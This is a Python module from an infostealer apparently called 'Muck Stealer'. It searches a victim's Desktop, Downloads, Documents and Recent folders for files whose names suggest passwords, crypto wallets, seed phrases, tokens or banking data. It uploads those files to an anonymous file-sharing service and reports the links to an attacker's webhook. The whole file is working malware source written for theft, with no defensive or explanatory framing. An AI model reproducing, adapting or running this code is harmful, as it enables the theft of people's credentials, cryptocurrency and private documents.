import os
import threading
import time
import json
from stealer.core import uploadToAnonfiles, LoadUrlib
from core.config import WEBHOOK_URL

KiwiFiles = []

def KiwiFolder(pathF, keywords):
    if not os.path.isdir(pathF):
        return
    i = 0
    ffound = []
    for file in os.listdir(pathF):
        full = os.path.join(pathF, file)
        if not os.path.isfile(full):
            continue
        i += 1
        if i <= 7:
            url = uploadToAnonfiles(full)
            if url:
                ffound.append([full, url])
        else:
            break
    if ffound:
        KiwiFiles.append(["folder", pathF, ffound])

def KiwiFile(path, keywords):
    if not os.path.isdir(path):
        return
    for item in os.listdir(path):
        full = os.path.join(path, item)
        for kw in keywords:
            if kw in item.lower():
                if os.path.isfile(full) and os.path.getsize(full) < 500000 and not item.endswith('.lnk'):
                    url = uploadToAnonfiles(full)
                    if url:
                        KiwiFiles.append(["file", full, url])
                    break
                elif os.path.isdir(full):
                    KiwiFolder(full, keywords)
                    break

def Kiwi(roaming):
    user = os.path.expanduser("~")
    path2search = [
        os.path.join(user, "Desktop"),
        os.path.join(user, "Downloads"),
        os.path.join(user, "Documents"),
        os.path.join(roaming, "Microsoft", "Windows", "Recent")
    ]
    key_words = ["passw","mdp","login","secret","wallet","crypto","exodus","discord","token","backup","seed","private","key","phrase","bank","recovery"]
    for patt in path2search:
        if os.path.exists(patt):
            threading.Thread(target=KiwiFile, args=(patt, key_words)).start()

def filestealr(roaming, GLINFO):
    Kiwi(roaming)
    time.sleep(5)
    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg) > 2 and arg[2]:
            if arg[0] == "folder":
                filetext += f"📁 {arg[1]}\n"
                for ffil in arg[2]:
                    filetext += f"└─ [{ffil[0].split('/')[-1]}]({ffil[1]})\n"
            else:
                filetext += f"📄 [{arg[1]}]({arg[2]})\n"
    if filetext != "\n":
        data = {"content": GLINFO, "embeds": [{"title": "File Stealer", "description": filetext, "footer": {"text": "Muck Stealer"}}]}
        LoadUrlib(WEBHOOK_URL, data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})